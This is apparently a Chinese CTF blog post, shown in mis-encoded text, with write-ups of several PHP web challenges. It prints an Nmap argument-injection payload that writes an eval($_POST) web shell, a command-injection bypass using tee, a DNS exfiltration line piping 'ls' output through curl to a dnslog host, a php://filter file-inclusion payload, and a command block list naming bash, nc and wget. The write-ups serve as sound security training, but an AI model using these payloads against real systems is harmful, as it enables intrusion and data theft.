<p>å¤šçº¿ç¨‹è¿˜æ˜¯å¿«ï¼Œç”¨äº†å…¶å®ƒè„šæœ¬è·‘äº†å‡ ä¸ªå°æ—¶<br><img src="/images/DC50DBF7CED349ac8E10BDB40CC53E96.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„æ–‡ä»¶å’Œå‚æ•°ï¼Œè¿›å…¥é¶åœº<br><img src="/images/251250150BDA4b88AF294AEB1C1B80ED.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p><img src="/images/FF0F9B418D7E4eb7ADF528F15FEAE10D.png" srcset="/img/loading.gif" lazyload><br>å¯åŠ¨é¶æœºï¼Œæ‰§è¡Œnmapå‘½ä»¤<br>å…ˆè¾“å…¥æ­£å¸¸å†…å®¹127.0.0.1<br><img src="/images/81815F7490084ee289012E710D1DA539.png" srcset="/img/loading.gif" lazyload><br>çœ‹çœ‹èƒ½ä¸èƒ½å‘½ä»¤æ‰§è¡Œ<br><img src="/images/5CB659C4FF1D452288D9E0EE60CFC5E5.png" srcset="/img/loading.gif" lazyload><br>å¯ä»¥çœ‹åˆ°|è¢«\è½¬ä¹‰ï¼Œåº”è¯¥æ˜¯è¢«escapeshellarg()å’Œescapeshellcmd()è½¬ä¹‰<br>å°è¯•ä½¿ç”¨å…¶å®ƒç®¡é“ç¬¦ï¼Œä¹Ÿæ˜¾ç¤ºé”™è¯¯<br>nmapçš„ä¸€äº›ç”¨æ³•</p>
<ul>
<li>-oN æ ‡å‡†ä¿å­˜</li>
<li>-oX XMLä¿å­˜</li>
<li>-oG Grepä¿å­˜</li>
<li>-oA ä¿å­˜åˆ°æ‰€æœ‰æ ¼å¼</li>
<li>-append-output è¡¥å……ä¿å­˜æ–‡ä»¶</li>
</ul>
<p>payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.phtml &#x27;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/B1F50110F98D43ddAAC362EB6CC4EDFE.png" srcset="/img/loading.gif" lazyload><br>è¿™é‡Œå·²ç»ç»•è¿‡äº†escapeshellargå’Œescapeshellcmd,è™½ç„¶æ˜¾ç¤ºé”™è¯¯ï¼Œä½†æ˜¯å·²ç»æˆåŠŸå†™å…¥1.phtml<br>phpåº”è¯¥æ˜¯è¢«è¿‡æ»¤äº†ï¼Œé‡‡ç”¨phtmlå’Œ?&#x3D;æ›¿ä»£php<br>æœ€ç»ˆflag</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> &#x27; &lt;?= @eval($_POST<span class="hljs-string">[&quot;a&quot;]</span>);?&gt; -oG <span class="hljs-number">1</span>.phtml &#x27;<br></code></pre></td></tr></table></figure>
<p>åœ¨1.phtmlå‘½ä»¤æ‰§è¡Œå³å¯<br><img src="/images/06F8D62AE11C4d32A11A397D4B278B34.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿˜æœ‰ä¸€ç§åšæ³•</p>
<ul>
<li>-iLè¯»å–æ‰«ææ–‡ä»¶</li>
</ul>
<p>payload</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> &#x27; -iL /flag -o xixi &#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/1CC4B5A965F8419c99F6F03620BBB576.png" srcset="/img/loading.gif" lazyload></p>
<p>æºç </p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;?<br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;settings.php&#x27;</span>);<br><br><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (isset($_POST[<span class="hljs-string">&#x27;host&#x27;</span>])):<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">defined</span>(<span class="hljs-string">&#x27;WEB_SCANS&#x27;</span>)) &#123;<br>        	<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Web scans disabled&#x27;</span>);<br>	&#125;<br><br>	$host = $_POST[<span class="hljs-string">&#x27;host&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(stripos($host,<span class="hljs-string">&#x27;php&#x27;</span>)!==false)&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>	&#125;<br>	$host = escapeshellarg($host);<br>	$host = escapeshellcmd($host);<br><br>	$filename = <span class="hljs-keyword">substr</span>(md5(<span class="hljs-keyword">time</span>() . <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)), <span class="hljs-number">0</span>, <span class="hljs-number">5</span>);<br>	$command = <span class="hljs-string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="hljs-string">&quot; -oX &quot;</span> . RESULTS_PATH . $filename . <span class="hljs-string">&quot; &quot;</span> . $host;<br>	$result_scan = shell_exec($command);<br>	<span class="hljs-keyword">if</span> (is_null($result_scan)) &#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		header(<span class="hljs-string">&#x27;Location: result.php?f=&#x27;</span> . $filename);<br>	&#125;<br><span class="hljs-keyword">else</span>:<br>?&gt;<br></code></pre></td></tr></table></figure>


<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-finalrce"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-finalrce" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]finalrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>è¿‡æ»¤äº†å¾ˆå¤šå‡½æ•°<br>å¯ä»¥å…ˆç”¨whomaiå’Œpwdè¿™äº›æ²¡ç¦ç”¨çš„å‡½æ•°çœ‹çœ‹ï¼Œå‘ç°æ²¡æœ‰å›æ˜¾,æ— å›æ˜¾RCE<br>å°è¯•å†™å…¥æ–‡ä»¶<br>è¿™é‡Œç”¨åˆ°teeå‘½ä»¤ï¼š</p>
<p>Linux teeå‘½ä»¤ç”¨äºè¯»å–æ ‡å‡†è¾“å…¥çš„æ•°æ®ï¼Œå¹¶å°†å…¶å†…å®¹è¾“å‡ºæˆæ–‡ä»¶ã€‚<br>payload</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">l\s /<span class="hljs-string">|tee 1.txt</span><br></code></pre></td></tr></table></figure>
<p>l\sç»•è¿‡è¿™åœ¨linuxä¸­æ˜¯å…è®¸çš„ï¼ŒåŒæ ·çš„è¿˜æœ‰lâ€™â€™så’Œlâ€â€s<br><img src="/images/2CAC52B611214c51A1536E7E77C0C19F.png" srcset="/img/loading.gif" lazyload><br><img src="/images/554051CD0A7742f19B4D30F99825DD91.png" srcset="/img/loading.gif" lazyload><br>æˆ–è€…ç”¨æ¨¡ç³ŠæŸ¥è¯¢</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tac</span> /fllll?aaaaaaggggggg|<span class="hljs-built_in">tee</span> 1.txt<br></code></pre></td></tr></table></figure>
<p>dnså¤–å¸¦å¯ä»¥ï¼Œä½†æ•ˆæœæœ‰é™</p>
<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?url=curl `l\s`.<span class="hljs-number">6</span>lwgd3.dnslog.cn<br></code></pre></td></tr></table></figure>
<p><img src="/images/D6DE42843F044a4fABE9F77181C247BF.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="é¹åŸæ¯-2022-ç®€å•åŒ…å«"><a href="#é¹åŸæ¯-2022-ç®€å•åŒ…å«" class="headerlink" title="[é¹åŸæ¯ 2022]ç®€å•åŒ…å«"></a>[é¹åŸæ¯ 2022]ç®€å•åŒ…å«</h2><p><img src="/images/28DCF2F6363C4d8a81D178C649B0FF91.png" srcset="/img/loading.gif" lazyload><br>è¿™é¢˜è²Œä¼¼ç‰¹åˆ«ç®€å•ï¼Œç»™äº†å…¥å£ä¼ªåè®®å°±å¥½ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¼ªåè®®è¯•è¯•<br><img src="/images/ED32879844344a6f83A8215334496EA3.png" srcset="/img/loading.gif" lazyload><br>ç«Ÿç„¶çˆ†äº†wafï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹index.phpçš„å†…å®¹</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;</span><br><span class="language-php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;</span><br><span class="language-php">&#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-php">    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #000000&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;</span><span class="hljs-symbol">&amp;lt;</span>?php<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>highlight_file<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;</span>(<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;</span>__FILE__<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;</span>);<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>include(<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;</span>$_POST<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;</span>[<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #DD0000&quot;</span>&gt;</span>&quot;flag&quot;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;</span>]);<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: #FF8000&quot;</span>&gt;</span>//flag<span class="hljs-symbol">&amp;nbsp;</span>in<span class="hljs-symbol">&amp;nbsp;</span>/var/www/html/flag.php;<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br></code></pre></td></tr></table></figure>
<p>è§£ç åå‘ç°åˆšæ‰çš„phpä»£ç ç«Ÿç„¶æ˜¯å‡å†’çš„<br>ç¦ç”¨äº†flagï¼Œå½“ç„¶è¿™é¢˜å¯ä»¥filteré“¾æ¼æ´ç›´æ¥è¿‡<br>ä½†æ˜¯å¸¸è§„çš„åŠæ³•æ˜¯çœ‹å®ƒçš„ifè¯­å¥</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">strlen(<span class="hljs-name">file_get_contents</span>(&#x27;php<span class="hljs-symbol">://input</span>&#x27;)) &lt; <span class="hljs-number">800</span><br></code></pre></td></tr></table></figure>
<p>å› ä¸ºæ˜¯andçš„å…³ç³»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è®©ç¬¬ä¸€ä¸ªåˆ¤æ–­ä¸ºfalse</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">800</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;flag=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>

<p>ç„¶åå°±æ‰§è¡Œäº†ä¼ªåè®®ï¼Œå°†base64ç¼–ç åçš„flag.phpæ˜¾ç¤ºå‡ºæ¥äº†</p>
<h2 id="é¹¤åŸæ¯-2021-EasyP"><a href="#é¹¤åŸæ¯-2021-EasyP" class="headerlink" title="[é¹¤åŸæ¯ 2021]EasyP"></a>[é¹¤åŸæ¯ 2021]EasyP</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br>include <span class="hljs-string">&#x27;utils.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$guess</span> = (string) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;guess&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$guess</span> === <span class="hljs-variable">$secret</span>) &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="hljs-variable">$flag</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$message</span> = <span class="hljs-string">&#x27;Wrong. Try Again&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/show_source/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(__FILE__);<br>&#125;<br>?&gt; <br></code></pre></td></tr></table></figure>

<p>å…ˆäº†è§£ä¸€ä¸‹$_SERVERå‚æ•°</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">æ¡ˆä¾‹ç½‘å€ï¼šhttps:<span class="hljs-regexp">//</span>www.shawroot.cc<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>] 	å¾—åˆ°ï¼š<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo<br><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>] å¾—åˆ°ï¼š<span class="hljs-regexp">/php/i</span>ndex.php<span class="hljs-regexp">/test/</span>foo?username=root<br></code></pre></td></tr></table></figure>

<p>$_SERVERâ€™REQUEST_URIâ€™ä¸ä¼šå°†å‚æ•°ä¸­çš„ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬æ¢ï¼Œ<br>ä¹Ÿå°±æ˜¯è¯´å®ƒè·å–åˆ°çš„urlä¸Šé¢çš„å€¼ï¼Œä¸ä¼šè¿›è¡Œurlè§£ç </p>
<p>basename()ï¼šè¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†</p>
<p>ä¾‹å­ï¼š<br>127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php æ˜¾ç¤ºï¼š1.php</p>
<p>127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;flag.php&#x2F;1.php æ˜¾ç¤ºï¼š1.php</p>
<p>å…ˆä¸Špayloadç»“åˆè§£é‡Š</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php/u</span>tils.php/%ff?%<span class="hljs-number">73</span>how_source=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
<p>&#x2F;index.php&#x2F;utils.php&#x2F;%ffï¼šåœ¨phpä¸­ï¼Œ&#x2F;index.php&#x2F;utils.php&#x2F;%ffè¢«è§£æä¸ºä¸€ä¸ªè·¯å¾„ä¿¡æ¯(Path info),å¹¶è¢«è®¾ç½®ä¸º$_SERVER[â€˜PATH_INFOâ€™] å˜é‡çš„å€¼ã€‚ç„¶åï¼Œè¿™ä¸ªè·¯å¾„ä¿¡æ¯ä¼šè¢«æ·»åŠ åˆ°$_SERVER[â€˜PHP_SELFâ€™] ä¸­ï¼Œå³$_SERVER[â€˜PHP_SELFâ€™] &#x3D; â€˜&#x2F;index.php&#x2F;utils.php&#x2F;%ffâ€™ã€‚</p>
<p>%ffæ˜¯urlç¼–ç ä¸­çš„ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä»£è¡¨ä¸€ä¸ªéæ‰“å°å­—ç¬¦ã€‚åœ¨PHPä¸­ï¼Œéæ‰“å°å­—ç¬¦é€šå¸¸ä¼šè¢«å¿½ç•¥ã€‚æ‰€ä»¥ï¼Œ&#x2F;utils.php&#x2F;%ffå®é™…ä¸Šè¢«PHPè§£æä¸º&#x2F;utils.php&#x2F;</p>
<p>ç„¶åï¼Œå½“PHPæ‰§è¡Œhighlight_file(basename($_SERVER[â€˜PHP_SELFâ€™]));è¿™æ®µä»£ç æ—¶ï¼Œbasename($_SERVER[â€˜PHP_SELFâ€™])ä¼šè¿”å›utils.phpï¼Œå› ä¸ºbasename()å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„æœ€åä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶åï¼Œæ‰€ä»¥ï¼Œ&#x2F;index.php&#x2F;utils.php&#x2F;%ff æœ€ç»ˆè¢«è§£æä¸º &#x2F;utils.phpã€‚<br>å…¶ä¸­show_sourceè¿˜å¯ä»¥ä»¥show sourceæˆ–show+sourceæ›¿ä»£</p>
<p><strong>%ffçš„ä½œç”¨è§£æ</strong><br>å½“ä½ è®¿é—®&#x2F;index.php&#x2F;utils.phpæ—¶ï¼Œå®é™…ä¸Šä½ æ­£åœ¨è®¿é—®index.phpè¿™ä¸ªæ–‡ä»¶ï¼Œè€Œ&#x2F;utils.phpè¢«è§†ä¸ºâ€œè·¯å¾„ä¿¡æ¯â€è¿™æ˜¯å› ä¸ºåœ¨PHPä¸­ï¼Œè·¯å¾„ä¿¡æ¯æ˜¯å¯ä»¥é€šè¿‡$_SERVER[â€˜PATH_INFOâ€™]æ¥è·å–çš„ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½œä¸ºæ–‡ä»¶åå¤„ç†çš„ï¼Œæ‰€ä»¥å½“ä½ è°ƒç”¨basename(_SERVER[â€˜PHP_SELFâ€™]) æ—¶ï¼Œå®ƒå®é™…ä¸Šä¼šè¿”å›index.phpï¼Œå› ä¸ºè¿™æ˜¯æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬æ–‡ä»¶ã€‚</p>
<p>å½“ä½ è®¿é—®&#x2F;index.php&#x2F;utils.php&#x2F;%ffæ—¶ï¼Œæƒ…å†µå°±å˜äº†ã€‚%ffæ˜¯ä¸€ä¸ªURLç¼–ç çš„éæ‰“å°å­—ç¬¦ï¼ŒPHPåœ¨å¤„ç†URLæ—¶ä¼šå¿½ç•¥å®ƒã€‚å› æ­¤utils.php&#x2F;%ffå®é™…ä¸Šè¢«è§£æä¸ºutils.phpã€‚è¿™å°±ä½¿å¾—basename($_SERVER[â€˜PHP_SELFâ€™]) è¿”å› utils.phpï¼Œè€Œä¸æ˜¯ index.phpã€‚</p>
<p>è¿™æ˜¯å› ä¸ºPHPåœ¨å¤„ç†URLæ—¶ï¼Œä¼šå°†%ffä¹‹åçš„éƒ¨åˆ†è§†ä¸ºè·¯å¾„ä¿¡æ¯ï¼Œè€Œå°†%ffä¹‹å‰çš„éƒ¨åˆ†è§†ä¸ºæ–‡ä»¶åã€‚æ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹utils.php%ffè¢«è§£æä¸ºutils.php,å¹¶ä¸”basename($_SERVER[â€˜PHP_SELFâ€™]) ä¼šè¿”å› utils.phpã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
